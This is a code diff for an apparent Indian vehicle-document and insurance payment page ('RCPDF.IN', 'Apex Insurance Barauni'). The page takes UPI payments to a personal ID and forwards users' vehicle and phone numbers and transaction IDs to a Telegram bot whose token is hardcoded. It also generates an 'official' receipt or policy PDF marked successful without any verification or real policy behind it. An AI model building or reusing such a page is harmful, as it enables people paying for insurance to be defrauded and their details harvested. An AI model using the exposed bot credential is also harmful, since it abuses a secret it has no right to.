@@ -5,9 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RCPDF.IN - Digital Document Information</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --primary: #ff0066; --ind-blue: #003399; }
+        :root { --primary: #ff0066; --ind-blue: #003399; --gold: linear-gradient(45deg, #bf953f, #fcf6ba, #b38728, #fbf5b7, #aa771c); }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
         
         body { 
@@ -17,286 +18,218 @@
         }
 
         .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
-        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; width: 28px; z-index: 1001; }
-        .menu-btn div { width: 100%; height: 3px; background: var(--ind-blue); border-radius: 2px; }
         .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }
-
-        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; box-shadow: 5px 0 15px rgba(0,0,0,0.2); overflow-y: auto; }
-        .sidebar.active { left: 0; }
-        .s-link { display: block; width: 100%; padding: 14px; margin-bottom: 12px; background: #f8f9fa; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; border: 1px solid #ddd; cursor:pointer; text-align: left; }
-        .s-link i { margin-right: 10px; color: var(--ind-blue); }
 
         .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
 
         .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
         .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
-        .ind-strip img { width: 30px; margin-bottom: 4px; }
         
         #vehInput { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
-        #mob, #fatherName, .utr-field, #promoInput { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; }
+        
+        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
 
-        .promo-section { display: flex; gap: 8px; margin-bottom: 15px; }
-        #promoInput { margin-bottom: 0; flex: 1; text-transform: uppercase; }
-        .apply-btn { background: #000; color: #fff; border: none; padding: 0 15px; border-radius: 12px; cursor: pointer; font-weight: bold; }
-
-        .neon-btn {
-            position: relative; background: #000; color: #fff; font-size: 16px; font-weight: 900;
-            padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
-            text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center;
+        /* GOLDEN GLOSSY BUTTON STYLE */
+        .btn-gold {
+            background: var(--gold);
+            color: #543c00;
+            border: 1px solid #b38728;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2), inset 0 0 10px rgba(255,255,255,0.5);
+            font-weight: 900;
+            position: relative;
+            overflow: hidden;
+            text-shadow: 1px 1px 0px rgba(255,255,255,0.3);
         }
-        .neon-btn::before {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
-            animation: rotateRGB 2s linear infinite;
+        .btn-gold::after {
+            content: ''; position: absolute; top: -50%; left: -60%; width: 20%; height: 200%;
+            background: rgba(255,255,255,0.4); transform: rotate(30deg);
+            animation: shine 3s infinite;
         }
-        .neon-btn::after { content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
-        
-        @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes shine { 0% { left: -60%; } 100% { left: 150%; } }
 
-        .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
-
-        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
-        .road { width: 85%; height: 4px; background: #333; position: relative; margin-top: 20px; }
-        .car { font-size: 45px; position: absolute; bottom: 0; left: 0; transform: scaleX(-1); }
-        .pct { font-size: 45px; font-weight: 900; color: #ff0066; }
+        /* INSURANCE SECTION STYLES (Apex Insurance) */
+        #insurance-section { display: none; text-align: left; animation: fadeIn 0.5s; }
+        .ins-header { text-align: center; margin-bottom: 20px; }
+        .form-group { margin-bottom: 15px; }
+        label { font-weight: bold; display: block; margin-bottom: 5px; font-size: 14px; }
+        input[type="text"], input[type="tel"], select { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; }
         
-        .footer { background: #fff; padding: 30px 20px; border-top: 3px solid var(--ind-blue); text-align: center; margin-top: 40px; }
-        .footer-links { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 15px; }
-        .footer-links span { cursor: pointer; color: #333; font-size: 14px; font-weight: bold; text-decoration: underline; }
+        .payment-box { background: #fff4e6; border: 2px dashed #ff9800; padding: 15px; border-radius: 10px; text-align: center; margin: 15px 0; }
         
-        .wa-float { position: fixed; bottom: 20px; right: 20px; background: #25d366; color: #fff; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; z-index: 3000; text-decoration: none; }
-        .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
+        .loader-wrap { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
+        
+        /* PDF AREA HIDDEN */
+        #pdfArea { position: absolute; left: -10000px; width: 600px; background: #fff; padding: 20px; color: #000; }
     </style>
 </head>
-<body onload="renderHistory()">
+<body>
 
     <div class="header">
-        <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
         <b class="logo">RCPDF.IN</b>
         <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
     </div>
 
-    <div class="sidebar" id="side">
-        <h3 style="margin-bottom:15px; color:var(--ind-blue);">Activity Log</h3>
-        <div id="historyList"><p style="font-size:12px; color:#999;">No records found.</p></div>
-        <hr style="margin:20px 0;">
-        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'"><i class="fas fa-shield-alt"></i> Insurance Info</button>
-        <button class="s-link" onclick="toggleM()" style="background:#ffdddd; margin-top: 20px;">Close</button>
-    </div>
-
-    <div id="successOverlay" class="overlay">
-        <h1 style="font-size: 40px;">😊</h1>
-        <h1 style="font-size: 30px;">Verification Complete!</h1>
-        <p style="font-size: 18px; margin-top: 10px;">Service Record has been updated.</p>
-        <button class="btn" id="dlBtn" style="background:#fff; color:green; width:260px; margin-top:25px; border: 2px solid green;">Download Receipt Now</button>
-    </div>
-
     <div class="card">
+        
         <div id="p1">
             <h2 style="margin-bottom:15px; color: var(--ind-blue);">Digital RC Verification</h2>
             <div class="hsrp-plate">
-                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
+                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg" width="30"><span>IND</span></div>
                 <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
             </div>
             <button class="btn" onclick="go2()">CHECK STATUS</button>
+            
+            <button class="btn btn-gold" onclick="openInsurance()">
+                <i class="fas fa-shield-alt"></i> APEX INSURANCE BARAUNI
+            </button>
         </div>
 
         <div id="p2" style="display:none;">
-            <div id="promo-msg" style="color: #138808; font-weight: bold; margin-bottom: 10px; display: none;">Offer Applied!</div>
-            <button class="neon-btn" onclick="pay()"></button>
-            <div style="background:#fff; padding:10px; border-radius:15px; display:inline-block; margin-bottom:15px; border:1px solid #ddd;">
-                <img id="qr" src="" width="160">
-                <p id="amtLabel" style="font-size:10px; font-weight:bold; margin-top:5px;">PAYMENT FOR VERIFICATION ₹120</p>
+            <h3 id="amtLabel">PAYMENT ₹120</h3>
+            <img id="qr" src="" width="160" style="margin: 10px 0;">
+            <input type="tel" id="utr" class="btn" style="background:#fff; color:#000; border:2px solid #ddd;" placeholder="Enter 12 Digit UTR">
+            <button class="btn" onclick="submitRC()">Verify & Generate</button>
+        </div>
+
+        <div id="insurance-section">
+            <div class="ins-header">
+                <h2 style="color:#003399;">🛡️ Apex Insurance</h2>
+                <p style="font-size:12px; font-weight:bold;">Begusarai's Trusted Portal</p>
+            </div>
+            
+            <div class="form-group">
+                <label>🚗 Vehicle Number</label>
+                <input type="text" id="ins_vNo" placeholder="BR-09-AB-1234" style="text-transform: uppercase;">
+            </div>
+            <div class="form-group">
+                <label>📱 WhatsApp Number</label>
+                <input type="tel" id="ins_mob" placeholder="9876543210" maxlength="10">
+            </div>
+            <div class="form-group">
+                <label>🛡️ Insurance Type</label>
+                <select id="ins_type" onchange="calcIns()">
+                    <option value="Third Party">📜 Third Party (Fastest)</option>
+                    <option value="Comprehensive">🌟 Comprehensive (Full)</option>
+                </select>
             </div>
 
-            <div class="promo-section">
-                <input type="text" id="promoInput" placeholder="HELLO20">
-                <button class="apply-btn" onclick="applyPromo()">APPLY</button>
+            <div class="payment-box">
+                <p>Payable Amount:</p>
+                <h2 id="ins_price">₹843</h2>
+                <img id="ins_qr" src="" width="150">
+                <p style="font-size:10px; margin-top:5px;">Scan QR to Pay</p>
             </div>
 
-            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10">
-            <input type="text" id="fatherName" placeholder="Father's Name (Optional)">
-            <input type="tel" id="utr" class="utr-field" placeholder="Enter 12 Digit UTR Number" maxlength="12" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <div class="form-group">
+                <label>🧾 UTR / Transaction ID</label>
+                <input type="text" id="ins_utr" placeholder="12 Digit UTR Number" maxlength="12">
+            </div>
 
-            <button class="btn" onclick="submit()">Verify & Generate Receipt</button>
+            <button class="btn" style="background:#28a745;" onclick="submitInsurance()">✅ Pay & Download Policy</button>
         </div>
     </div>
-
-    <div class="footer">
-        <div class="footer-links">
-            <span onclick="alert('Privacy Policy: Information is handled securely.')">Privacy Policy</span> | 
-            <span onclick="alert('Terms: Service is for information records.')">Terms & Conditions</span> | 
-            <span onclick="alert('Refund: Processing fees are non-refundable.')">Refund Policy</span>
-        </div>
-        <p style="font-size: 13px; color: #666; font-weight: bold;">© 2026 RCPDF.IN | Digital Information Portal</p>
-    </div>
-
-    <a href="https://wa.me/918709610091" class="wa-float" target="_blank"><i class="fab fa-whatsapp"></i></a>
 
     <div class="loader-wrap" id="load">
-        <div class="road"><div class="car" id="carIcon">🚗</div></div>
-        <div class="pct" id="pText">0%</div>
-        <p style="color:#fff; margin-top:10px;">🔍 Searching Records...</p>
+        <h2 id="loadText">Processing...</h2>
+        <div style="width:80%; height:10px; background:#333; margin-top:20px; border-radius:5px; overflow:hidden;">
+            <div id="bar" style="width:0%; height:100%; background:var(--primary); transition:0.1s;"></div>
+        </div>
+    </div>
+
+    <div id="pdfArea">
+        <div style="border:4px solid #003399; padding:20px; text-align:center;">
+            <h1 style="color:#003399;">APEX INSURANCE BARAUNI</h1>
+            <p>Official Payment Receipt</p>
+            <hr>
+            <div style="text-align:left; margin-top:20px; line-height:2;">
+                <p><b>Vehicle No:</b> <span id="pdf_v"></span></p>
+                <p><b>Mobile:</b> <span id="pdf_m"></span></p>
+                <p><b>Type:</b> <span id="pdf_t"></span></p>
+                <p><b>Amount:</b> <span id="pdf_a"></span></p>
+                <p><b>UTR No:</b> <span id="pdf_u"></span></p>
+                <p><b>Status:</b> ✅ SUCCESSFUL</p>
+            </div>
+            <div style="margin-top:30px;">
+                <p>© 2026 Apex Solutions | All Rights Reserved</p>
+            </div>
+        </div>
     </div>
 
     <script>
-        const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
-        const T_CHAT_ID = "5600045707";
-        let currentAmount = 120.00;
-        let promoUsed = "NONE";
-        let globalTxId = "";
+        const BOT_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
+        const CHAT_ID = "5600045707";
 
-        function toggleM() { document.getElementById('side').classList.toggle('active'); }
+        function formatV(i) { i.value = i.value.toUpperCase().replace(/[^A-Z0-9]/g, ''); }
 
-        function formatV(i) {
-            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-            let out = "";
-            if (v.length > 0) out += v.substring(0, 2);
-            if (v.length > 2) out += "-" + v.substring(2, 4);
-            if (v.length > 4) out += "-" + v.substring(4, 6);
-            if (v.length > 6) out += "-" + v.substring(6, 10);
-            i.value = out;
+        // Logic to switch to Insurance
+        function openInsurance() {
+            document.getElementById('p1').style.display = 'none';
+            document.getElementById('insurance-section').style.display = 'block';
+            calcIns();
         }
 
-        function updatePaymentLinks(amt) {
-            const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${amt.toFixed(2)}&cu=INR&tn=VERIFICATION%20FEE`;
-            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + encodeURIComponent(upi);
+        function calcIns() {
+            let type = document.getElementById('ins_type').value;
+            let amt = (type === "Third Party") ? 843 : 1250;
+            document.getElementById('ins_price').innerText = "₹" + amt;
+            let upi = `upi://pay?pa=8709610091@okbizaxis&pn=Apex%20Insurance&am=${amt}&cu=INR&tn=Insurance_Fee`;
+            document.getElementById('ins_qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(upi);
         }
 
-        function applyPromo() {
-            const code = document.getElementById('promoInput').value.toUpperCase();
-            if(code === "RC70") {
-                currentAmount = 70.00; 
-                promoUsed = "RC70";
-                alert("Applied! Payable: ₹70");
-            } else if(code === "RC60") {
-                currentAmount = 60.00; 
-                promoUsed = "RC60";
-                alert("Applied! Payable: ₹60");
-            } else {
-                alert("Code not valid.");
-                return;
-            }
-            document.getElementById('promo-msg').style.display = "block";
-            document.getElementById('amtLabel').innerText = `PAYMENT FOR VERIFICATION ₹${currentAmount}`;
-            updatePaymentLinks(currentAmount);
+        function submitInsurance() {
+            let v = document.getElementById('ins_vNo').value;
+            let m = document.getElementById('ins_mob').value;
+            let u = document.getElementById('ins_utr').value;
+            let t = document.getElementById('ins_type').value;
+            let a = document.getElementById('ins_price').innerText;
+
+            if(!v || m.length<10 || u.length<12) { alert("Please fill all details correctly."); return; }
+
+            showLoader("Generating Policy...");
+
+            // Send to Telegram
+            let msg = `🛡️ *NEW INSURANCE ORDER*\n\n🚗 Veh: ${v}\n📱 Mob: ${m}\n🛡️ Type: ${t}\n💰 Amt: ${a}\n🔢 UTR: ${u}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+
+            // Set PDF Values
+            document.getElementById('pdf_v').innerText = v;
+            document.getElementById('pdf_m').innerText = m;
+            document.getElementById('pdf_t').innerText = t;
+            document.getElementById('pdf_a').innerText = a;
+            document.getElementById('pdf_u').innerText = u;
+
+            // Auto Download PDF
+            setTimeout(() => {
+                const element = document.getElementById('pdfArea');
+                html2pdf().from(element).save(`Apex_Insurance_${v}.pdf`).then(() => {
+                    hideLoader();
+                    alert("Policy Application Downloaded Successfully!");
+                    location.reload();
+                });
+            }, 3000);
         }
 
+        // Original RC Logic
         function go2() {
-            if(document.getElementById('vehInput').value.length < 9) { alert("Enter valid vehicle details."); return; }
-            updatePaymentLinks(currentAmount);
-            document.getElementById('p1').style.display='none'; 
-            document.getElementById('p2').style.display='block';
+            document.getElementById('p1').style.display = 'none';
+            document.getElementById('p2').style.display = 'block';
+            let upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR&tn=RC_Verify`;
+            document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(upi);
         }
 
-        function pay() { 
-            const upiUrl = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${currentAmount.toFixed(2)}&cu=INR&tn=VERIFICATION%20FEE`;
-            window.location.href = upiUrl; 
-        }
-
-        function submit() {
-            const m = document.getElementById('mob').value;
-            const u = document.getElementById('utr').value;
-            if(m.length < 10) { alert("Invalid Mobile Number."); return; }
-            if(u.length !== 12) { alert("Enter 12-digit UTR."); return; }
-
-            document.getElementById('load').style.display='flex';
+        function showLoader(txt) {
+            document.getElementById('load').style.display = 'flex';
+            document.getElementById('loadText').innerText = txt;
             let p = 0;
-            let iv = setInterval(async () => {
-                p += 2;
-                document.getElementById('pText').innerText = p + "%";
-                document.getElementById('carIcon').style.left = (p * 0.85) + "%";
-                if (p === 60) {
-                    const now = new Date();
-                    globalTxId = "RCV" + Math.floor(Math.random() * 9000000000);
-                    const dStr = now.toLocaleDateString('en-IN');
-                    const tStr = now.toLocaleTimeString('en-IN');
-                    
-                    let cap = `✅ *RECORD VERIFIED*\n\n🆔 *Ref:* \`${globalTxId}\`\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n🔢 *UTR:* ${u}\n💰 *Amt:* ₹${currentAmount}\n🎟️ *Promo:* ${promoUsed}`;
-                    fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(cap)}&parse_mode=Markdown`);
-                    
-                    saveHistory(document.getElementById('vehInput').value, dStr, tStr);
-                    
-                    document.getElementById('dlBtn').onclick = () => {
-                        makePDF(dStr, tStr, globalTxId);
-                    };
-                }
-                if (p >= 100) {
-                    clearInterval(iv);
-                    document.getElementById('load').style.display='none';
-                    document.getElementById('successOverlay').style.display='flex';
-                }
-            }, 80);
+            let itv = setInterval(() => {
+                p += 5;
+                document.getElementById('bar').style.width = p + "%";
+                if(p>=100) clearInterval(itv);
+            }, 100);
         }
 
-        function saveHistory(v, d, t) {
-            let hist = JSON.parse(localStorage.getItem('rc_history_user') || "[]");
-            hist.unshift({v, d, t});
-            localStorage.setItem('rc_history_user', JSON.stringify(hist.slice(0, 5)));
-        }
-
-        function renderHistory() {
-            let hist = JSON.parse(localStorage.getItem('rc_history_user') || "[]");
-            if(hist.length > 0) {
-                let hHtml = hist.map(h => `<div style="font-size:11px; padding:8px; border-bottom:1px solid #eee; text-align:left;">🚗 <b>${h.v}</b><br><small>${h.d}</small></div>`).join('');
-                document.getElementById('historyList').innerHTML = hHtml;
-            }
-        }
-
-        function makePDF(d, t, tx) {
-            const { jsPDF } = window.jspdf;
-            const doc = new jsPDF();
-            const veh = document.getElementById('vehInput').value;
-            const mob = document.getElementById('mob').value;
-            const fn = document.getElementById('fatherName').value || "N/A";
-            const uNum = document.getElementById('utr').value;
-
-            // RESTORED ORIGINAL PDF FORMAT
-            // Blue Header
-            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
-            doc.setTextColor(255); doc.setFont("helvetica", "bold"); doc.setFontSize(22);
-            doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
-
-            // Info Table
-            doc.setTextColor(0); doc.setFontSize(12); doc.setDrawColor(200);
-            let y = 50;
-            const tableData = [
-                ["REFERENCE ID:", tx], ["DATE & TIME:", `${d} | ${t}`], 
-                ["VEHICLE NO:", veh], ["FATHER'S NAME:", fn], 
-                ["CONTACT NO:", mob], ["UTR NUMBER:", uNum]
-            ];
-            tableData.forEach(row => {
-                doc.rect(15, y, 180, 10); doc.text(row[0], 20, y + 7); doc.text(row[1], 85, y + 7);
-                y += 10;
-            });
-
-            // Amount Box
-            y += 5;
-            doc.setFillColor(240, 245, 255); doc.rect(15, y, 180, 25, 'F'); doc.rect(15, y, 180, 25);
-            doc.setFontSize(11);
-            doc.text("Total Processing Fee:", 20, y + 15); 
-            doc.setFont("helvetica", "bold");
-            doc.text("INR " + currentAmount.toFixed(2), 85, y + 15);
-            
-            // Support Info
-            y += 35;
-            doc.setFont("helvetica", "normal"); doc.rect(15, y, 180, 45); 
-            doc.text("SUPPORT INFORMATION", 25, y + 15);
-            doc.addImage(document.getElementById('qr').src, 'PNG', 150, y + 5, 35, 35);
-
-            // Terms
-            y += 65; doc.setFontSize(14); doc.text("TERMS AND CONDITIONS", 15, y);
-            doc.setFontSize(10); doc.text(["1. Digital Information Receipt only.", "2. Fees are non-refundable.", "3. Information based on available records."], 15, y + 8);
-            
-            // Thank You
-            doc.setTextColor(184, 134, 11); doc.setFont("times", "italic"); doc.setFontSize(40);
-            doc.text("Thank You", 105, y + 55, null, null, "center");
-            
-            doc.setDrawColor(0); doc.rect(5, 5, 200, 287);
-            
-            doc.save(`Receipt_${veh}.pdf`);
-            setTimeout(() => location.reload(), 1500);
-        }
+        function hideLoader() { document.getElementById('load').style.display = 'none'; }
     </script>
+
 </body>
 </html>
